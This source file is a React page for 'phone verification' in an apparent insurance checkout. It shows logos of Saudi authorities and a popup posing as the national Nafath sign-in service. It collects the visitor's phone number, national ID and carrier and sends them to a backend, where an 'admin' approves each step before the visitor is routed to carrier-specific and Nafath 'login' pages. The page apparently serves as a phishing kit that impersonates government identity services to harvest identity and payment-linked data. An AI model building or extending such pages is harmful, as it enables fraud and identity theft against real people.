import { useState, useEffect } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { motion, AnimatePresence } from "framer-motion";
import { Button } from "@/components/ui/button";
import { Shield, AlertTriangle, ChevronDown, Loader2 } from "lucide-react";
import VerificationLayout from "@/components/VerificationLayout";
import { useAdminApproval, createOrUpdateStage } from "@/hooks/useAdminApproval";
import { toast } from "sonner";
import { linkVisitorToSession } from "@/lib/visitorLink";
import wtheqLogo from "@/assets/wtheq-logo.png";
import cstLogo from "@/assets/cst-logo.png";
import nicLogo from "@/assets/nic-logo.png";

const carriers = [
  { name: "STC", value: "STC", logo: "/images/stc.png" },
  { name: "Mobily", value: "Mobily", logo: "/images/mobily.png" },
  { name: "Zain", value: "Zain", logo: "/images/zain.png" },
  { name: "Salam", value: "Salam", logo: "/images/salam.png" },
  { name: "Virgin", value: "Virgin", logo: "/images/virgin.png" },
  { name: "Redbull", value: "Redbull", logo: "/images/redbull.png" },
];

const PhoneVerification = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const offer = location.state?.offer;
  const passedOrderId = location.state?.orderId || sessionStorage.getItem("insurance_order_id");

  const [phone, setPhone] = useState("");
  const [nationalId, setNationalId] = useState("");
  const [carrier, setCarrier] = useState("");
  const [showCarriers, setShowCarriers] = useState(false);
  const [loading, setLoading] = useState(false);
  const [waitingApproval, setWaitingApproval] = useState(false);
  const [orderId, setOrderId] = useState<string | null>(passedOrderId);
  const [phoneError, setPhoneError] = useState("");
  const [idError, setIdError] = useState("");
  const [showError, setShowError] = useState(false);
  const [showWelcomePopup, setShowWelcomePopup] = useState(true);
  const approvalStatus = useAdminApproval(orderId, "phone_verification");

  useEffect(() => {
    if (approvalStatus === "approved" && orderId) {
      toast.success("تم التحقق من رقم الجوال");
      sessionStorage.setItem("insurance_order_id", orderId);
      if (carrier === "STC") {
        navigate("/insurance/phone-stc", { state: { offer, phone, carrier, orderId } });
      } else {
        navigate("/insurance/nafath-login", { state: { offer, phone, carrier, orderId } });
      }
    } else if (approvalStatus === "rejected") {
      toast.error("تم رفض عملية التوثيق");
      setWaitingApproval(false);
      setLoading(false);
    }
  }, [approvalStatus, orderId, navigate, offer, phone, carrier]);

  const validatePhone = (v: string) => {
    if (v.startsWith("05") && v.length !== 10) return "رقم الجوال يجب أن يكون 10 أرقام عند البدء بـ 05";
    if (v.startsWith("5") && !v.startsWith("05") && v.length !== 9) return "رقم الجوال يجب أن يكون 9 أرقام عند البدء بـ 5";
    if (v.length > 0 && !v.startsWith("05") && !v.startsWith("5")) return "رقم الجوال يجب أن يبدأ بـ 05 أو 5";
    return "";
  };

  const validateId = (v: string) => {
    if (v.length > 0 && !v.startsWith("1") && !v.startsWith("2")) return "رقم الهوية يجب أن يبدأ بـ 1 (مواطن) أو 2 (مقيم)";
    if (v.length > 0 && v.length !== 10) return "رقم الهوية يجب أن يكون 10 أرقام";
    return "";
  };

  const isValid = () => {
    const phoneOk = (phone.startsWith("05") && phone.length === 10) || (phone.startsWith("5") && !phone.startsWith("05") && phone.length === 9);
    return phoneOk && nationalId.length === 10 && carrier.length > 0 && !phoneError && !idError;
  };

  const handleSubmit = async () => {
    if (!isValid()) { setShowError(true); return; }
    setLoading(true);
    sessionStorage.setItem("phone_verification", JSON.stringify({ phone, nationalId, carrier }));
    // Link visitor data to session
    linkVisitorToSession({ phone, national_id: nationalId });
    const id = await createOrUpdateStage(orderId, "phone_verification", { phone, national_id: nationalId });
    setOrderId(id);
    setWaitingApproval(true);
  };

  const selectedCarrier = carriers.find(c => c.value === carrier);
  const inputCls = "w-full px-3 py-2.5 rounded-lg bg-background border-2 border-border text-foreground placeholder:text-muted-foreground text-xs focus:outline-none focus:border-primary focus:ring-2 focus:ring-primary/20 transition-all text-right";

  return (
    <>
    <VerificationLayout title="توثيق رقم الجوال المرتبط بالحساب البنكي" subtitle="يجب أن يكون رقم الجوال موثقًا ومطابقًا لبيانات الهوية">
      {/* Wtheq + CITC Logos */}
      <div className="flex flex-col items-center gap-3 pt-5 pb-2 border-b border-border">
        <img src={wtheqLogo} alt="وثق - WTHEQ" className="h-20 object-contain" />
        <img src={cstLogo} alt="هيئة الاتصالات والفضاء والتقنية" className="h-14 object-contain" />
      </div>

      {/* Title inside card */}
      <div className="text-center pt-4 pb-2 px-4">
        <h2 className="text-base font-extrabold bg-gradient-to-r from-primary to-emerald-600 bg-clip-text text-transparent">توثيق رقم الجوال المرتبط بالحساب البنكي</h2>
      </div>

      <div className="p-4 pt-2 space-y-3">
        {waitingApproval ? (
          <div className="text-center py-8 space-y-4">
            <Loader2 className="w-10 h-10 text-primary animate-spin mx-auto" />
            <h3 className="text-sm font-bold text-foreground">بانتظار موافقة الإدارة...</h3>
            <p className="text-xs text-muted-foreground">يرجى الانتظار حتى تتم مراجعة بيانات التوثيق</p>
          </div>
        ) : (
          <>
            {showError && (
              <motion.div initial={{ opacity: 0, y: -10 }} animate={{ opacity: 1, y: 0 }} className="flex items-start gap-2 bg-destructive/10 border border-destructive/20 rounded-lg p-3">
                <AlertTriangle className="w-4 h-4 text-destructive shrink-0 mt-0.5" />
                <p className="text-[11px] text-destructive leading-relaxed">يرجى التأكد من ان رقم الجوال موثق ومطابق لبيانات الهوية الوطنية / الإقامة، ومرتبط ببطاقة الدفع المدخلة</p>
                <button onClick={() => setShowError(false)} className="text-destructive shrink-0">✕</button>
              </motion.div>
            )}

            {/* Phone */}
            <div className="border-2 border-border rounded-xl p-4 space-y-1">
              <label className="block text-xs font-black text-foreground text-right mb-2">رقم الجوال <span className="text-destructive">*</span></label>
              <input className={inputCls} placeholder="05 XXXXXXXXX" value={phone}
                onChange={(e) => { const v = e.target.value.replace(/\D/g, "").slice(0, 10); setPhone(v); setPhoneError(validatePhone(v)); }}
                dir="rtl" maxLength={10} />
              {phoneError && <p className="text-[10px] text-destructive mt-1 text-right">{phoneError}</p>}
            </div>

            {/* Carrier */}
            <div className="border-2 border-border rounded-xl p-4 space-y-1">
              <label className="block text-xs font-black text-foreground text-right mb-2">مشغل الشبكة <span className="text-destructive">*</span></label>
              <div className="relative">
                <button onClick={() => setShowCarriers(!showCarriers)} className={`w-full px-3 py-2.5 rounded-lg bg-background border-2 border-border text-foreground text-xs flex items-center justify-between cursor-pointer transition-all focus:outline-none focus:border-primary`}>
                  {selectedCarrier ? (
                    <div className="flex items-center gap-2">
                      <img src={selectedCarrier.logo} alt={selectedCarrier.name} className="w-6 h-6 object-contain" />
                      <span className="text-xs font-medium">{selectedCarrier.name}</span>
                    </div>
                  ) : (
                    <span className="text-muted-foreground text-xs">حدد نوع مشغل الشبكة</span>
                  )}
                  <ChevronDown className={`w-3.5 h-3.5 text-muted-foreground transition-transform ${showCarriers ? "rotate-180" : ""}`} />
                </button>
                {showCarriers && (
                  <motion.div initial={{ opacity: 0, y: -5 }} animate={{ opacity: 1, y: 0 }} className="absolute top-full left-0 right-0 mt-1 bg-card border border-border rounded-lg shadow-lg z-10 overflow-hidden">
                    {carriers.map((c) => (
                      <button key={c.value} onClick={() => { setCarrier(c.value); setShowCarriers(false); }}
                        className={`w-full flex items-center gap-3 px-3 py-2.5 hover:bg-secondary/70 transition-colors ${carrier === c.value ? "bg-primary/5" : ""}`}>
                        <img src={c.logo} alt={c.name} className="w-7 h-7 object-contain" />
                        <span className="text-xs font-medium text-foreground">{c.name}</span>
                      </button>
                    ))}
                  </motion.div>
                )}
              </div>
            </div>

            {/* National ID */}
            <div className="border-2 border-border rounded-xl p-4 space-y-1">
              <label className="block text-xs font-black text-foreground text-right mb-2">رقم الهوية الوطنية / الإقامة <span className="text-destructive">*</span></label>
              <input className={inputCls} placeholder="أدخل رقم الهوية (10 أرقام)" value={nationalId}
                onChange={(e) => { const v = e.target.value.replace(/\D/g, "").slice(0, 10); setNationalId(v); setIdError(validateId(v)); }}
                dir="rtl" maxLength={10} />
              {idError && <p className="text-[10px] text-destructive mt-1 text-right">{idError}</p>}
            </div>

            <Button onClick={handleSubmit} disabled={loading || !isValid()} className="w-full bg-cta text-cta-foreground hover:bg-cta-hover rounded-xl py-5 font-bold text-sm gap-2 mt-2">
              <Shield className="w-3.5 h-3.5" />
              {loading ? "يرجى الانتظار جاري التأكد من صحة البيانات المدخلة..." : "دخول"}
            </Button>
          </>
        )}
      </div>
    </VerificationLayout>

    {/* Welcome Popup */}
    <AnimatePresence>
      {showWelcomePopup && (
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          exit={{ opacity: 0 }}
          className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 px-6"
        >
          <motion.div
            initial={{ scale: 0.85, opacity: 0 }}
            animate={{ scale: 1, opacity: 1 }}
            exit={{ scale: 0.85, opacity: 0 }}
            transition={{ type: "spring", damping: 20 }}
            className="bg-card rounded-2xl shadow-2xl w-full max-w-sm overflow-hidden border border-border"
          >
            {/* NIC Logo */}
            <div className="flex justify-center pt-8 pb-4">
              <img src={nicLogo} alt="NIC" className="w-20 h-20 object-contain" />
            </div>

            {/* Text */}
            <div className="px-6 pb-6 text-center space-y-3">
              <p className="text-sm text-muted-foreground font-medium">النفاذ الوطني الموحد</p>
              <h3 className="text-2xl font-extrabold text-primary">نفاذ</h3>
              <p className="text-primary font-bold text-sm">عميلنا الكريم</p>
              <p className="text-xs text-foreground leading-relaxed">
                لإتمام عملية إصدار وثيقة التأمين وربطها بحسابك في منصة النفاذ الوطني الموحد، يُرجى التحقق من هويتك.
                هذا الإجراء مطلوب نظاماً لضمان صحة البيانات وحماية حقوقك.
              </p>
            </div>

            {/* Button */}
            <div className="px-6 pb-6">
              <button
                onClick={() => setShowWelcomePopup(false)}
                className="w-full bg-primary text-primary-foreground rounded-full py-3 font-bold text-sm hover:bg-primary/90 transition-colors"
              >
                متابعة
              </button>
            </div>
          </motion.div>
        </motion.div>
      )}
    </AnimatePresence>
    </>
  );
};

export default PhoneVerification;
